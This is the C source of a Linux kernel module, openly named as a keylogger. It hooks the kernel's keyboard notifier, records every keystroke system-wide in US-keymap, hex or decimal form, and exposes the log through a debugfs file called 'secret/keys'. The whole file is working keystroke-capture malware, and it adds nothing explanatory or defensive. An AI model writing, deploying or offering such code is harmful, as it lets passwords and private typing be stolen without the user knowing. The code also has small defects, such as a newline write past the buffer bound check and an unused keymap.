#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

MODULE_LICENSE("GPL v2");

#define BUF_SIZE (PAGE_SIZE << 2) // 16kb buffer size
#define KEYCODE_LEN 12 // Maximum length of a keycode string
#define US 0 // Type code for US character log
#define HEX 1 // Type code for hexadecimal log
#define DEC 2 // Type code for decimal log

// Declarations
static int mode; // User-specified log pattern
module_param(mode, int, 0644);
MODULE_PARM_DESC(mode, "log format (0:US keys (default), 1:Hexadecimal keycodes, 2:Decimal keycodes)");

// Debugfs structures
static struct dentry *file;
static struct dentry *subdir;

// Function to handle read operations on the debugfs file
static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);

// Keyboard notifier callback function invoked on keyboard events
static int cb(struct notifier_block *nblock, unsigned long code, void *_param);

// Keycode-to-string function prototype to avoid the compiler warning
void string_conv(int kode, int shifted, char *buffer, int sys); 

// US keymap
/*
    Keymap references:
    https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
    http://www.quadibloc.com/comp/scan.htm
*/
static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};

static const char *us_keymap_alphanumeric_only[][2] = {
      {"1", "!"}, {"2", "@"},                                         // 0-3
      {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
      {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
      {"-", "_"}, {"=", "+"},                                         // 12-14
      {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
      {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
      {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
      {"a", "A"}, {"s", "S"},                                         // 28-31
      {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
      {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
      {"'", "\""}, {"`", "~"}, {"\\", "|"},                           // 40-43
      {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
      {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
      {".", ">"}, {"/", "?"},
      {" ", " "}
};

// Buffer to store the logged keys
static size_t buf_pos;
static char keys_buf[BUF_SIZE];

// Debugfs file operations
const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
};

// Read function to allow user-space programs to read logged keys from the Debugfs file
static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset) {
    return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

// Keyboard notifier block
static struct notifier_block blk = {
	.notifier_call = cb,
};

// Method keys_read

/** 
* Store keycode as a string saved to the buffer
* kode: keycode generated by kernel after user input
* shifted: determines if the user pressed the shift key while typing
* buffer: buffer to store the string representation of logged keys
* sys: log based on key system (US, HEX, or DEC)
*/
void string_conv(int kode, int shifted, char *buffer, int sys) {
	switch (sys) {
	case US: // For US system
		if (kode > KEY_RESERVED && kode <= KEY_PAUSE) { // check to see if kode is in the valid range for us keymap
			const char *us_key = (shifted == 1) ? us_keymap[kode][1] : us_keymap[kode][0]; // Determine if shift key was pressed
			snprintf(buffer, KEYCODE_LEN, "%s", us_key); // store the string in the buffer
		} // if statement
		break;
	case HEX: // For hexadecimal system
		if (kode > KEY_RESERVED && kode < KEY_MAX) { // check to see if kode is in the valid range for hexadecimal keymap
			snprintf(buffer, KEYCODE_LEN, "%x %x", kode, shifted); // store the string in the buffer
		} // if statement 
		break;
	case DEC: // For decimal system
		if (kode > KEY_RESERVED && kode < KEY_MAX) { // check to see if kode is in the valid range for decimal keymap
			snprintf(buffer, KEYCODE_LEN, "%d %d", kode, shifted); // store the string in the buffer
		} // if statement
		break;
	} // switch statement
} // Method string_conv

int cb(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param)
{
	size_t len; //length of keycode
	char keybuf[KEYCODE_LEN] = {0}; //not sure about this one
	struct keyboard_notifier_param *param = _param;

	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
		 code, param->down, param->shift, param->value);

	/* Trace only when a key is pressed down */
	if (!(param->down))
		return NOTIFY_OK; //returns 0x001
	
	/* Convert keycode to readable string in keybuf */
	string_conv(param->value, param->shift, keybuf, mode);
	len = strlen(keybuf);
	if (len < 1) /* Unmapped keycode */
		return NOTIFY_OK; //returns 0x001

	/* Reset key string buffer position if exhausted */
	if ((buf_pos + len) >= BUF_SIZE) //if buffer position is greater than buffer length then reset to 0
		buf_pos = 0;

	/* Copy readable key to key string buffer */
	strncpy(keys_buf + buf_pos, keybuf, len); //
	buf_pos += len;

	/* Append newline to keys in special cases */
	if (mode) //for keys like ctrl, alt, del
		keys_buf[buf_pos++] = '\n';
	pr_debug("%s\n", keybuf);

	return NOTIFY_OK; //returns 0x001
}

// Module initialization
static int __init keylogger_init(void)
{
    if (mode < 0 || mode > 2)
        return -EINVAL;

    subdir = debugfs_create_dir("secret", NULL); // Creates debugfs directory
    if (IS_ERR(subdir))
        return PTR_ERR(subdir);
    if (!subdir)
        return -ENOENT;

    file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops); // Creates debugfs file to read keys from
    if (!file) {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }

    register_keyboard_notifier(&blk);
    return 0;
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&blk);
    debugfs_remove_recursive(subdir);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

